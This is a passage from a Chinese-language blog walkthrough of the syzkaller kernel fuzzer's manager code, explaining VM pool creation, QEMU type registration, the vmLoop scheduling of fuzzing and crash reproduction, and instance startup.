				numFuzzing<span class="token punctuation">,</span> executed<span class="token punctuation">,</span> corpusCover<span class="token punctuation">,</span> corpusSignal<span class="token punctuation">,</span> maxSignal<span class="token punctuation">,</span> crashes<span class="token punctuation">,</span> numReproducing<span class="token punctuation">)</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

	<span class="token keyword">if</span> <span class="token operator">*</span>flagBench <span class="token operator">!=</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span> 
	<span class="token comment">// ...</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">if</span> mgr<span class="token punctuation">.</span>dash <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">go</span> mgr<span class="token punctuation">.</span><span class="token function">dashboardReporter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>

	osutil<span class="token punctuation">.</span><span class="token function">HandleInterrupts</span><span class="token punctuation">(</span>vm<span class="token punctuation">.</span>Shutdown<span class="token punctuation">)</span>
	<span class="token keyword">if</span> mgr<span class="token punctuation">.</span>vmPool <span class="token operator">==</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		log<span class="token punctuation">.</span><span class="token function">Logf</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"no VMs started (type=none)"</span><span class="token punctuation">)</span>
		log<span class="token punctuation">.</span><span class="token function">Logf</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"you are supposed to start syz-fuzzer manually as:"</span><span class="token punctuation">)</span>
		log<span class="token punctuation">.</span><span class="token function">Logf</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"syz-fuzzer -manager=manager.ip:%v [other flags as necessary]"</span><span class="token punctuation">,</span> mgr<span class="token punctuation">.</span>serv<span class="token punctuation">.</span>port<span class="token punctuation">)</span>
		<span class="token operator">&lt;-</span>vm<span class="token punctuation">.</span>Shutdown
		<span class="token keyword">return</span>
	<span class="token punctuation">&#125;</span>
	mgr<span class="token punctuation">.</span><span class="token function">vmLoop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 「3」</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><strong>「1」</strong> ，调用 <code>vm.Create</code> 创建 vmPool，顾名思义，vmPool 是用于管理虚拟机的一个池，这里不同的虚拟化方案都使用统一的接口来创建 vmPool，具体随后细述<br><strong>「2」</strong>，开启一个 goroutine，定时记录虚拟机状态，覆盖率，crash 数量等信息<br><strong>「3」</strong>，调用 <code>mgr.vmLoop</code> 开始启动虚拟机进行 fuzz，这个函数涵盖了大量的工作</p>
<h4 id="vm-Create"><a href="#vm-Create" class="headerlink" title="vm.Create"></a>vm.Create</h4><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// vm/vm.go</span>

<span class="token comment">// Create creates a VM pool that can be used to create individual VMs.</span>
<span class="token keyword">func</span> <span class="token function">Create</span><span class="token punctuation">(</span>cfg <span class="token operator">*</span>mgrconfig<span class="token punctuation">.</span>Config<span class="token punctuation">,</span> debug <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>Pool<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	typ<span class="token punctuation">,</span> ok <span class="token operator">:=</span> vmimpl<span class="token punctuation">.</span>Types<span class="token punctuation">[</span>cfg<span class="token punctuation">.</span>Type<span class="token punctuation">]</span> <span class="token comment">// 「1」</span>
	<span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> fmt<span class="token punctuation">.</span><span class="token function">Errorf</span><span class="token punctuation">(</span><span class="token string">"unknown instance type '%v'"</span><span class="token punctuation">,</span> cfg<span class="token punctuation">.</span>Type<span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
	env <span class="token operator">:=</span> <span class="token operator">&amp;</span>vmimpl<span class="token punctuation">.</span>Env<span class="token punctuation">&#123;</span>
		Name<span class="token punctuation">:</span>     cfg<span class="token punctuation">.</span>Name<span class="token punctuation">,</span>
		OS<span class="token punctuation">:</span>       cfg<span class="token punctuation">.</span>TargetOS<span class="token punctuation">,</span>
		Arch<span class="token punctuation">:</span>     cfg<span class="token punctuation">.</span>TargetVMArch<span class="token punctuation">,</span>
		Workdir<span class="token punctuation">:</span>  cfg<span class="token punctuation">.</span>Workdir<span class="token punctuation">,</span>
		Image<span class="token punctuation">:</span>    cfg<span class="token punctuation">.</span>Image<span class="token punctuation">,</span>
		SSHKey<span class="token punctuation">:</span>   cfg<span class="token punctuation">.</span>SSHKey<span class="token punctuation">,</span>
		SSHUser<span class="token punctuation">:</span>  cfg<span class="token punctuation">.</span>SSHUser<span class="token punctuation">,</span>
		Timeouts<span class="token punctuation">:</span> cfg<span class="token punctuation">.</span>Timeouts<span class="token punctuation">,</span>
		Debug<span class="token punctuation">:</span>    debug<span class="token punctuation">,</span>
		Config<span class="token punctuation">:</span>   cfg<span class="token punctuation">.</span>VM<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span>
	impl<span class="token punctuation">,</span> err <span class="token operator">:=</span> typ<span class="token punctuation">.</span><span class="token function">Ctor</span><span class="token punctuation">(</span>env<span class="token punctuation">)</span> <span class="token comment">// 「2」</span>
	<span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
		<span class="token keyword">return</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> err
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> <span class="token operator">&amp;</span>Pool<span class="token punctuation">&#123;</span>
		impl<span class="token punctuation">:</span>     impl<span class="token punctuation">,</span>
		workdir<span class="token punctuation">:</span>  env<span class="token punctuation">.</span>Workdir<span class="token punctuation">,</span>
		template<span class="token punctuation">:</span> cfg<span class="token punctuation">.</span>WorkdirTemplate<span class="token punctuation">,</span>
		timeouts<span class="token punctuation">:</span> cfg<span class="token punctuation">.</span>Timeouts<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>「1」</strong>，根据配置文件的 <code>type</code> 字段获取对应 Type 对象为后续使用，<code>type</code> 字段表示虚拟机的类型，如 qemu，vmware</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// vm/vmimpl/vmimpl.go</span>

<span class="token keyword">type</span> Type <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
	Ctor       ctorFunc
	Overcommit <span class="token builtin">bool</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> <span class="token punctuation">(</span>
<span class="token comment">// ...</span>
	Types <span class="token operator">=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">map</span><span class="token punctuation">[</span><span class="token builtin">string</span><span class="token punctuation">]</span>Type<span class="token punctuation">)</span>
<span class="token punctuation">)</span>

<span class="token comment">// Register registers a new VM type within the package.</span>
<span class="token keyword">func</span> <span class="token function">Register</span><span class="token punctuation">(</span>typ <span class="token builtin">string</span><span class="token punctuation">,</span> ctor ctorFunc<span class="token punctuation">,</span> allowsOvercommit <span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	Types<span class="token punctuation">[</span>typ<span class="token punctuation">]</span> <span class="token operator">=</span> Type<span class="token punctuation">&#123;</span>
		Ctor<span class="token punctuation">:</span>       ctor<span class="token punctuation">,</span>
		Overcommit<span class="token punctuation">:</span> allowsOvercommit<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>各种虚拟化对应的模块调用 <code>Register</code> 函数注册 Type 对象，以 qemu 为例</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// vm/qemu/qemu.go</span>

<span class="token keyword">func</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">var</span> <span class="token boolean">_</span> vmimpl<span class="token punctuation">.</span>Infoer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token operator">*</span>instance<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token boolean">nil</span><span class="token punctuation">)</span>
	vmimpl<span class="token punctuation">.</span><span class="token function">Register</span><span class="token punctuation">(</span><span class="token string">"qemu"</span><span class="token punctuation">,</span> ctor<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><strong>「2」</strong>，调用对应 Type 对象的 Ctor 函数指针创建实现了 Pool 接口的对象，以 qemu 为例，观看 qemu.ctor 函数实现</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// vm/vmimpl/vmimpl.go</span>
<span class="token keyword">type</span> Pool <span class="token keyword">interface</span> <span class="token punctuation">&#123;</span>
	<span class="token comment">// Count returns total number of VMs in the pool.</span>
	<span class="token function">Count</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">int</span>

	<span class="token comment">// Create creates and boots a new VM instance.</span>
	<span class="token function">Create</span><span class="token punctuation">(</span>workdir <span class="token builtin">string</span><span class="token punctuation">,</span> index <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>Instance<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// vm/qemu/qemu.go</span>

<span class="token keyword">type</span> Pool <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
	env        <span class="token operator">*</span>vmimpl<span class="token punctuation">.</span>Env
	cfg        <span class="token operator">*</span>Config
	target     <span class="token operator">*</span>targets<span class="token punctuation">.</span>Target
	archConfig <span class="token operator">*</span>archConfig
	version    <span class="token builtin">string</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">func</span> <span class="token function">ctor</span><span class="token punctuation">(</span>env <span class="token operator">*</span>vmimpl<span class="token punctuation">.</span>Env<span class="token punctuation">)</span> <span class="token punctuation">(</span>vmimpl<span class="token punctuation">.</span>Pool<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	archConfig <span class="token operator">:=</span> archConfigs<span class="token punctuation">[</span>env<span class="token punctuation">.</span>OS<span class="token operator">+</span><span class="token string">"/"</span><span class="token operator">+</span>env<span class="token punctuation">.</span>Arch<span class="token punctuation">]</span>
	cfg <span class="token operator">:=</span> <span class="token operator">&amp;</span>Config<span class="token punctuation">&#123;</span>
		Count<span class="token punctuation">:</span>       <span class="token number">1</span><span class="token punctuation">,</span>
		CPU<span class="token punctuation">:</span>         <span class="token number">1</span><span class="token punctuation">,</span>
		Mem<span class="token punctuation">:</span>         <span class="token number">1024</span><span class="token punctuation">,</span>
		ImageDevice<span class="token punctuation">:</span> <span class="token string">"hda"</span><span class="token punctuation">,</span>
		Qemu<span class="token punctuation">:</span>        archConfig<span class="token punctuation">.</span>Qemu<span class="token punctuation">,</span>
		QemuArgs<span class="token punctuation">:</span>    archConfig<span class="token punctuation">.</span>QemuArgs<span class="token punctuation">,</span>
		NetDev<span class="token punctuation">:</span>      archConfig<span class="token punctuation">.</span>NetDev<span class="token punctuation">,</span>
		Snapshot<span class="token punctuation">:</span>    <span class="token boolean">true</span><span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span>
	<span class="token comment">// ...</span>

	pool <span class="token operator">:=</span> <span class="token operator">&amp;</span>Pool<span class="token punctuation">&#123;</span>
		env<span class="token punctuation">:</span>        env<span class="token punctuation">,</span>
		cfg<span class="token punctuation">:</span>        cfg<span class="token punctuation">,</span>
		version<span class="token punctuation">:</span>    version<span class="token punctuation">,</span>
		target<span class="token punctuation">:</span>     targets<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span>env<span class="token punctuation">.</span>OS<span class="token punctuation">,</span> env<span class="token punctuation">.</span>Arch<span class="token punctuation">)</span><span class="token punctuation">,</span>
		archConfig<span class="token punctuation">:</span> archConfig<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> pool<span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="mgr-vmLoop"><a href="#mgr-vmLoop" class="headerlink" title="mgr.vmLoop"></a>mgr.vmLoop</h4><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// syz-manager/manager.go</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>mgr <span class="token operator">*</span>Manager<span class="token punctuation">)</span> <span class="token function">vmLoop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token comment">// ...</span>
	<span class="token keyword">for</span> shutdown <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token operator">||</span> <span class="token function">len</span><span class="token punctuation">(</span>instances<span class="token punctuation">)</span> <span class="token operator">!=</span> vmCount <span class="token punctuation">&#123;</span>
		mgr<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Lock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
		phase <span class="token operator">:=</span> mgr<span class="token punctuation">.</span>phase
		mgr<span class="token punctuation">.</span>mu<span class="token punctuation">.</span><span class="token function">Unlock</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token comment">// ...</span>
		log<span class="token punctuation">.</span><span class="token function">Logf</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"loop: phase=%v shutdown=%v instances=%v/%v %+v repro: pending=%v reproducing=%v queued=%v"</span><span class="token punctuation">,</span>
			phase<span class="token punctuation">,</span> shutdown <span class="token operator">==</span> <span class="token boolean">nil</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>instances<span class="token punctuation">)</span><span class="token punctuation">,</span> vmCount<span class="token punctuation">,</span> instances<span class="token punctuation">,</span>
			<span class="token function">len</span><span class="token punctuation">(</span>pendingRepro<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>reproducing<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>reproQueue<span class="token punctuation">)</span><span class="token punctuation">)</span>

		canRepro <span class="token operator">:=</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token builtin">bool</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">return</span> phase <span class="token operator">>=</span> phaseTriagedHub <span class="token operator">&amp;&amp;</span>
				<span class="token function">len</span><span class="token punctuation">(</span>reproQueue<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> reproInstances<span class="token operator">+</span>instancesPerRepro <span class="token operator">&lt;=</span> vmCount
		<span class="token punctuation">&#125;</span>

		<span class="token keyword">if</span> shutdown <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span> 
			<span class="token keyword">for</span> <span class="token function">canRepro</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">len</span><span class="token punctuation">(</span>instances<span class="token punctuation">)</span> <span class="token operator">>=</span> instancesPerRepro <span class="token punctuation">&#123;</span> <span class="token comment">// 「1」</span>
				last <span class="token operator">:=</span> <span class="token function">len</span><span class="token punctuation">(</span>reproQueue<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
				crash <span class="token operator">:=</span> reproQueue<span class="token punctuation">[</span>last<span class="token punctuation">]</span>
				reproQueue<span class="token punctuation">[</span>last<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">nil</span>
				reproQueue <span class="token operator">=</span> reproQueue<span class="token punctuation">[</span><span class="token punctuation">:</span>last<span class="token punctuation">]</span>
				vmIndexes <span class="token operator">:=</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">int</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> instances<span class="token punctuation">[</span><span class="token function">len</span><span class="token punctuation">(</span>instances<span class="token punctuation">)</span><span class="token operator">-</span>instancesPerRepro<span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token operator">...</span><span class="token punctuation">)</span>
				instances <span class="token operator">=</span> instances<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token function">len</span><span class="token punctuation">(</span>instances<span class="token punctuation">)</span><span class="token operator">-</span>instancesPerRepro<span class="token punctuation">]</span>
				reproInstances <span class="token operator">+=</span> instancesPerRepro
				atomic<span class="token punctuation">.</span><span class="token function">AddUint32</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mgr<span class="token punctuation">.</span>numReproducing<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>
				log<span class="token punctuation">.</span><span class="token function">Logf</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"loop: starting repro of '%v' on instances %+v"</span><span class="token punctuation">,</span> crash<span class="token punctuation">.</span>Title<span class="token punctuation">,</span> vmIndexes<span class="token punctuation">)</span>
				<span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					features <span class="token operator">:=</span> mgr<span class="token punctuation">.</span>checkResult<span class="token punctuation">.</span>Features
					res<span class="token punctuation">,</span> stats<span class="token punctuation">,</span> err <span class="token operator">:=</span> repro<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span>crash<span class="token punctuation">.</span>Output<span class="token punctuation">,</span> mgr<span class="token punctuation">.</span>cfg<span class="token punctuation">,</span> features<span class="token punctuation">,</span> mgr<span class="token punctuation">.</span>reporter<span class="token punctuation">,</span> mgr<span class="token punctuation">.</span>vmPool<span class="token punctuation">,</span> vmIndexes<span class="token punctuation">)</span>
					reproDone <span class="token operator">&lt;-</span> <span class="token operator">&amp;</span>ReproResult<span class="token punctuation">&#123;</span>
						instances<span class="token punctuation">:</span> vmIndexes<span class="token punctuation">,</span>
						report0<span class="token punctuation">:</span>   crash<span class="token punctuation">.</span>Report<span class="token punctuation">,</span>
						res<span class="token punctuation">:</span>       res<span class="token punctuation">,</span>
						stats<span class="token punctuation">:</span>     stats<span class="token punctuation">,</span>
						err<span class="token punctuation">:</span>       err<span class="token punctuation">,</span>
						hub<span class="token punctuation">:</span>       crash<span class="token punctuation">.</span>hub<span class="token punctuation">,</span>
					<span class="token punctuation">&#125;</span>
				<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">for</span> <span class="token operator">!</span><span class="token function">canRepro</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">len</span><span class="token punctuation">(</span>instances<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 「2」</span>
				last <span class="token operator">:=</span> <span class="token function">len</span><span class="token punctuation">(</span>instances<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
				idx <span class="token operator">:=</span> instances<span class="token punctuation">[</span>last<span class="token punctuation">]</span>
				instances <span class="token operator">=</span> instances<span class="token punctuation">[</span><span class="token punctuation">:</span>last<span class="token punctuation">]</span>
				log<span class="token punctuation">.</span><span class="token function">Logf</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"loop: starting instance %v"</span><span class="token punctuation">,</span> idx<span class="token punctuation">)</span>
				<span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
					crash<span class="token punctuation">,</span> err <span class="token operator">:=</span> mgr<span class="token punctuation">.</span><span class="token function">runInstance</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span>
					runDone <span class="token operator">&lt;-</span> <span class="token operator">&amp;</span>RunResult<span class="token punctuation">&#123;</span>idx<span class="token punctuation">,</span> crash<span class="token punctuation">,</span> err<span class="token punctuation">&#125;</span>
				<span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span>

<span class="token comment">// ...</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p><strong>「1」</strong>，存在需要复现的 crash，且有足够的虚拟机，则取出 <strong>instancesPerRepro</strong> （4 与 vmCount 的最小值） 个虚拟机以供调用 <code>repro.Run</code> 复现 crash</p>
<p><strong>「2」</strong>，没有 crash 且还有虚拟机可用，取出一个虚拟机调用 <code>mgr.runInstance</code> 进行 fuzz</p>
<h5 id="mgr-runInstance"><a href="#mgr-runInstance" class="headerlink" title="mgr.runInstance"></a>mgr.runInstance</h5><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// syz-manager/manager.go</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>mgr <span class="token operator">*</span>Manager<span class="token punctuation">)</span> <span class="token function">runInstance</span><span class="token punctuation">(</span>index <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>Crash<span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	mgr<span class="token punctuation">.</span><span class="token function">checkUsedFiles</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
	instanceName <span class="token operator">:=</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"vm-%d"</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span>

	rep<span class="token punctuation">,</span> vmInfo<span class="token punctuation">,</span> err <span class="token operator">:=</span> mgr<span class="token punctuation">.</span><span class="token function">runInstanceInner</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> instanceName<span class="token punctuation">)</span> 

	machineInfo <span class="token operator">:=</span> mgr<span class="token punctuation">.</span>serv<span class="token punctuation">.</span><span class="token function">shutdownInstance</span><span class="token punctuation">(</span>instanceName<span class="token punctuation">)</span>
	<span class="token keyword">if</span> <span class="token function">len</span><span class="token punctuation">(</span>vmInfo<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>
		machineInfo <span class="token operator">=</span> <span class="token function">append</span><span class="token punctuation">(</span><span class="token function">append</span><span class="token punctuation">(</span>vmInfo<span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> machineInfo<span class="token operator">...</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#125;</span>
	
<span class="token comment">// ...</span>

	crash <span class="token operator">:=</span> <span class="token operator">&amp;</span>Crash<span class="token punctuation">&#123;</span>
		vmIndex<span class="token punctuation">:</span>     index<span class="token punctuation">,</span>
		hub<span class="token punctuation">:</span>         <span class="token boolean">false</span><span class="token punctuation">,</span>
		Report<span class="token punctuation">:</span>      rep<span class="token punctuation">,</span>
		machineInfo<span class="token punctuation">:</span> machineInfo<span class="token punctuation">,</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">return</span> crash<span class="token punctuation">,</span> <span class="token boolean">nil</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>调用 <code>mgr.runInstanceInner</code>  后，整理输出返回</p>
<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// syz-manager/manager.go</span>

<span class="token keyword">func</span> <span class="token punctuation">(</span>mgr <span class="token operator">*</span>Manager<span class="token punctuation">)</span> <span class="token function">runInstanceInner</span><span class="token punctuation">(</span>index <span class="token builtin">int</span><span class="token punctuation">,</span> instanceName <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>report<span class="token punctuation">.</span>Report<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	inst<span class="token punctuation">,</span> err <span class="token operator">:=</span> mgr<span class="token punctuation">.</span>vmPool<span class="token punctuation">.</span><span class="token function">Create</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span>
	<span class="token comment">// ...</span>
	
	fuzzerBin<span class="token punctuation">,</span> err <span class="token operator">:=</span> inst<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>mgr<span class="token punctuation">.</span>cfg<span class="token punctuation">.</span>FuzzerBin<span class="token punctuation">)</span> <span class="token comment">// 「1」</span>
	<span class="token comment">// ...</span>

	<span class="token comment">// If ExecutorBin is provided, it means that syz-executor is already in the image,</span>
	<span class="token comment">// so no need to copy it.</span>
	executorBin <span class="token operator">:=</span> mgr<span class="token punctuation">.</span>sysTarget<span class="token punctuation">.</span>ExecutorBin
	<span class="token keyword">if</span> executorBin <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>
		executorBin<span class="token punctuation">,</span> err <span class="token operator">=</span> inst<span class="token punctuation">.</span><span class="token function">Copy</span><span class="token punctuation">(</span>mgr<span class="token punctuation">.</span>cfg<span class="token punctuation">.</span>ExecutorBin<span class="token punctuation">)</span> <span class="token comment">// 「2」</span>
		
		<span class="token comment">// ...</span>
	<span class="token punctuation">&#125;</span>

<span class="token comment">// ...</span>

	cmd <span class="token operator">:=</span> instance<span class="token punctuation">.</span><span class="token function">FuzzerCmd</span><span class="token punctuation">(</span>fuzzerBin<span class="token punctuation">,</span> executorBin<span class="token punctuation">,</span> instanceName<span class="token punctuation">,</span>
		mgr<span class="token punctuation">.</span>cfg<span class="token punctuation">.</span>TargetOS<span class="token punctuation">,</span> mgr<span class="token punctuation">.</span>cfg<span class="token punctuation">.</span>TargetArch<span class="token punctuation">,</span> fwdAddr<span class="token punctuation">,</span> mgr<span class="token punctuation">.</span>cfg<span class="token punctuation">.</span>Sandbox<span class="token punctuation">,</span> procs<span class="token punctuation">,</span> fuzzerV<span class="token punctuation">,</span>
		mgr<span class="token punctuation">.</span>cfg<span class="token punctuation">.</span>Cover<span class="token punctuation">,</span> <span class="token operator">*</span>flagDebug<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> mgr<span class="token punctuation">.</span>cfg<span class="token punctuation">.</span>Timeouts<span class="token punctuation">.</span>Slowdown<span class="token punctuation">)</span> 
